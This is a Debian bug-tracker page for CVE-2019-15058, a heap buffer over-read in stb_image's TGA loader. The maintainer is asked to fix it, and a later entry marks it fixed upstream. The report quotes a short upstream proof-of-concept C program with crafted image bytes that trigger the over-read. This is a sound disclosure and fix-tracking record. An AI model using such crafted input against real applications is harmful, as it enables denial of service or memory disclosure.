<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<link rel="icon" href="/favicon.png">
<title>#934973 - libstb: CVE-2019-15058 - Debian Bug report logs</title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/css/bugs.css" type="text/css">

<link rel="canonical" href="&lt;a href=&quot;bugreport.cgi?bug=934973&quot;&gt;934973&lt;/a&gt;">
<script type="text/javascript">
<!--
function toggle_infmessages()
{
        allDivs=document.getElementsByTagName("div");
        for (var i = 0 ; i < allDivs.length ; i++ )
        {
                if (allDivs[i].className == "infmessage")
                {
                        allDivs[i].style.display=(allDivs[i].style.display == 'none' | allDivs[i].style.display == '') ? 'block' : 'none';
                }
        }
}
-->
</script>
</head>
<body>
<h1>Debian Bug report logs - 
<a href="mailto:934973@bugs.debian.org">#934973</a><br>
libstb: CVE-2019-15058</h1>
<div class="versiongraph"><a href="version.cgi?absolute=0;package=src%3Alibstb;collapse=1;info=1;found=libstb%2F0.0~git20190617.5.c72a95d-2"><img alt="version graph" src="version.cgi?found=libstb%2F0.0~git20190617.5.c72a95d-2;absolute=0;package=src%3Alibstb;height=2;width=2;collapse=1"></a></div>
<div class="pkginfo">
  <p>Package:
     <a class="submitter" href="pkgreport.cgi?src=libstb">src:libstb</a>;
Maintainer for <a href="pkgreport.cgi?src=libstb">src:libstb</a> is <a href="pkgreport.cgi?maint=mmyangfl%40gmail.com">Yangfl &lt;mmyangfl@gmail.com&gt;</a>; </p>

</div>

<div class="buginfo">
  <p>Reported by: <a href="pkgreport.cgi?submitter=carnil%40debian.org">Salvatore Bonaccorso &lt;carnil@debian.org&gt;</a></p>
  <p>Date: Sat, 17 Aug 2019 14:15:02 UTC</p>

<p>Severity: important</p>
<p>Tags: fixed-upstream, security, upstream</p>

<p>Found in version libstb/0.0~git20190617.5.c72a95d-2</p>



<p>Forwarded to <a href="https://github.com/nothings/stb/issues/790">https://github.com/nothings/stb/issues/790</a></p>
</div>

<p><a href="mailto:934973@bugs.debian.org">Reply</a> or <a href="mailto:934973-subscribe@bugs.debian.org">subscribe</a> to this bug.</p>
<p><a href="javascript:toggle_infmessages();">Toggle useless messages</a></p><div class="msgreceived"><p>View this report as an <a href="bugreport.cgi?bug=934973;mbox=yes">mbox folder</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;mboxstatus=yes">status mbox</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;mboxmaint=yes">maintainer mbox</a></p></div>

<div class="infmessage"><hr><p>
<a name="1"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, team@security.debian.org, Yangfl &lt;mmyangfl@gmail.com&gt; -->
<!-- time:1566051305 -->
<strong>Report forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, team@security.debian.org, Yangfl &lt;mmyangfl@gmail.com&gt;</code>:<br>
<code>Bug#934973</code>; Package <code>src:libstb</code>.
 (Sat, 17 Aug 2019 14:15:05 GMT) (<a href="bugreport.cgi?bug=934973;msg=2">full text</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;msg=2">mbox</a>, <a href="#1">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="3"></a>
<!-- request_addr: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- time:1566051305 -->
<strong>Acknowledgement sent</strong>
to <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>:<br>
New Bug report received and forwarded.  Copy sent to <code>carnil@debian.org, team@security.debian.org, team@security.debian.org, Yangfl &lt;mmyangfl@gmail.com&gt;</code>.
 (Sat, 17 Aug 2019 14:15:05 GMT) (<a href="bugreport.cgi?bug=934973;msg=4">full text</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;msg=4">mbox</a>, <a href="#3">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="5"></a><a name="msg5"></a><a href="#5">Message #5</a> received at submit@bugs.debian.org (<a href="bugreport.cgi?bug=934973;msg=5">full text</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;msg=5">mbox</a>, <a href="mailto:934973@bugs.debian.org?subject=Re%3A%20libstb%3A%20CVE-2019-15058&amp;In-Reply-To=%3C156605110810.18915.2874120537996250026.reportbug%40eldamar.local%3E&amp;References=%3C156605110810.18915.2874120537996250026.reportbug%40eldamar.local%3E&amp;body=On%20Sat%2C%2017%20Aug%202019%2016%3A11%3A48%20%2B0200%20Salvatore%20Bonaccorso%20%3Ccarnil%40debian.org%3E%20wrote%3A%0A%3E%20Source%3A%20libstb%0A%3E%20Version%3A%200.0~git20190617.5.c72a95d-2%0A%3E%20Severity%3A%20important%0A%3E%20Tags%3A%20security%20upstream%0A%3E%20Forwarded%3A%20https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fissues%2F790%0A%3E%20%0A%3E%20Hi%2C%0A%3E%20%0A%3E%20The%20following%20vulnerability%20was%20published%20for%20libstb.%0A%3E%20%0A%3E%20CVE-2019-15058%5B0%5D%3A%0A%3E%20%7C%20stb_image.h%20%28aka%20the%20stb%20image%20loader%29%202.23%20has%20a%20heap-based%20buffer%0A%3E%20%7C%20over-read%20in%20stbi__tga_load%2C%20leading%20to%20Information%20Disclosure%20or%0A%3E%20%7C%20Denial%20of%20Service.%0A%3E%20%0A%3E%20The%20reproduce%20the%20issue%2C%20upstream%20issue%20provides%20a%20poc%3A%0A%3E%20%0A%3E%20%7C%23define%20STBI_WINDOWS_UTF8%0A%3E%20%7C%23define%20STB_IMAGE_WRITE_IMPLEMENTATION%0A%3E%20%7C%23include%20%22stb_image_write.h%22%0A%3E%20%7C%23define%20STB_IMAGE_IMPLEMENTATION%0A%3E%20%7C%23include%20%22stb_image.h%22%0A%3E%20%7C%23define%20STB_DEFINE%0A%3E%20%7C%23include%20%22stb.h%22%0A%3E%20%7C%23include%3Cstdio.h%3E%0A%3E%20%7C%23include%3Cstdlib.h%3E%0A%3E%20%7Cunsigned%20char%20data%5B%5D%20%3D%0A%3E%20%7C%7B%0A%3E%20%7C%20%200xAF%2C%200x01%2C%200x09%2C%200x00%2C%200x00%2C%200x00%2C%200x00%2C%200x10%2C%200x14%2C%200x0A%2C%0A%3E%20%7C%20%200xAF%2C%200x00%2C%200xEF%2C%200xEF%2C%200xEF%2C%200x11%2C%200x10%2C%200xEF%2C%200xEB%2C%200xF5%2C%0A%3E%20%7C%20%200x50%2C%200xFE%2C%200xFE%2C%200x09%0A%3E%20%7C%7D%3B%0A%3E%20%7Cint%20main%28int%20argc%2C%20char%20%2A%2Aargv%29%0A%3E%20%7C%7B%0A%3E%20%7C%20%20%20%20int%20x%2Cy%2Cn%3B%0A%3E%20%7C%20%20%20%20stbi_load_from_memory%28data%2Csizeof%28data%29%2C%26x%2C%26y%2C%26n%2C4%29%3B%0A%3E%20%7C%20%20%20%20return%200%3B%0A%3E%20%7C%7D%0A%3E%20%0A%3E%20If%20you%20fix%20the%20vulnerability%20please%20also%20make%20sure%20to%20include%20the%0A%3E%20CVE%20%28Common%20Vulnerabilities%20%26%20Exposures%29%20id%20in%20your%20changelog%20entry.%0A%3E%20%0A%3E%20For%20further%20information%20see%3A%0A%3E%20%0A%3E%20%5B0%5D%20https%3A%2F%2Fsecurity-tracker.debian.org%2Ftracker%2FCVE-2019-15058%0A%3E%20%20%20%20%20https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2019-15058%0A%3E%20%5B1%5D%20https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fissues%2F790%0A%3E%20%0A%3E%20Please%20adjust%20the%20affected%20versions%20in%20the%20BTS%20as%20needed.%0A%3E%20%0A%3E%20Regards%2C%0A%3E%20Salvatore%0A%3E%20%0A%3E%20%0A">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=carnil%40debian.org" alt="">
<div class="header"><span class="headerfield">From:</span> Salvatore Bonaccorso &lt;carnil@debian.org&gt;</div>
<div class="header"><span class="headerfield">To:</span> Debian Bug Tracking System &lt;submit@bugs.debian.org&gt;</div>
<div class="header"><span class="headerfield">Subject:</span> libstb: CVE-2019-15058</div>
<div class="header"><span class="headerfield">Date:</span> Sat, 17 Aug 2019 16:11:48 +0200</div>
</div>
<pre class="message">Source: libstb
Version: 0.0~git20190617.5.c72a95d-2
Severity: important
Tags: security upstream
Forwarded: <a href="https://github.com/nothings/stb/issues/790">https://github.com/nothings/stb/issues/790</a>

Hi,

The following vulnerability was published for libstb.

<a href="https://security-tracker.debian.org/tracker/CVE-2019-15058">CVE-2019-15058</a>[0]:
| stb_image.h (aka the stb image loader) 2.23 has a heap-based buffer
| over-read in stbi__tga_load, leading to Information Disclosure or
| Denial of Service.

The reproduce the issue, upstream issue provides a poc:

|#define STBI_WINDOWS_UTF8
|#define STB_IMAGE_WRITE_IMPLEMENTATION
|#include &quot;stb_image_write.h&quot;
|#define STB_IMAGE_IMPLEMENTATION
|#include &quot;stb_image.h&quot;
|#define STB_DEFINE
|#include &quot;stb.h&quot;
|#include&lt;stdio.h&gt;
|#include&lt;stdlib.h&gt;
|unsigned char data[] =
|{
|  0xAF, 0x01, 0x09, 0x00, 0x00, 0x00, 0x00, 0x10, 0x14, 0x0A,
|  0xAF, 0x00, 0xEF, 0xEF, 0xEF, 0x11, 0x10, 0xEF, 0xEB, 0xF5,
|  0x50, 0xFE, 0xFE, 0x09
|};
|int main(int argc, char **argv)
|{
|    int x,y,n;
|    stbi_load_from_memory(data,sizeof(data),&amp;x,&amp;y,&amp;n,4);
|    return 0;
|}

If you fix the vulnerability please also make sure to include the
CVE (Common Vulnerabilities &amp; Exposures) id in your changelog entry.

For further information see:

[0] <a href="https://security-tracker.debian.org/tracker/CVE-2019-15058">https://security-tracker.debian.org/tracker/CVE-2019-15058</a>
    <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15058">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15058</a>
[1] <a href="https://github.com/nothings/stb/issues/790">https://github.com/nothings/stb/issues/790</a>

Please adjust the affected versions in the BTS as needed.

Regards,
Salvatore


</pre>

<div class="msgreceived"><hr><p>
<a name="6"></a>
<!-- command:tag -->
<!-- requester: debian-bts-link@lists.debian.org -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1625505684 -->
<!-- new_data:
$new_data = {
              &#39;keywords&#39; =&gt; &#39;upstream fixed-upstream security&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;keywords&#39; =&gt; &#39;security upstream&#39;
            };
-->
<strong>Added tag(s) fixed-upstream.</strong>
Request was from <code>debian-bts-link@lists.debian.org</code>
to <code>control@bugs.debian.org</code>.
 (Mon, 05 Jul 2021 17:21:24 GMT) (<a href="bugreport.cgi?bug=934973;msg=7">full text</a>, <a href="bugreport.cgi?bug=934973;mbox=yes;msg=7">mbox</a>, <a href="#6">link</a>).</p></p></div>

<hr>
<p class="msgreceived">Send a report that <a href="https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=934973">this bug log contains spam</a>.</p>
<hr>
<ADDRESS>Debian bug tracking system administrator &lt;<A HREF="mailto:owner@bugs.debian.org">owner@bugs.debian.org</A>&gt;.
Last modified:
<!--timestamp-->Sat Oct 30 18:36:02 2021<!--end timestamp-->; 
Machine Name:
<!--machinename-->buxtehude<!--machinename-->
<P>
<A HREF="https://www.debian.org/Bugs/">Debian Bug tracking system</A>
</p>
<p>
  Debbugs is free software and licensed under the terms of the GNU
  Public License version 2. The current version can be obtained
  from <a href="https://bugs.debian.org/debbugs-source/">https://bugs.debian.org/debbugs-source/</a>.
</p>
<p>
Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.
</p>
</ADDRESS>

</body>
</html>
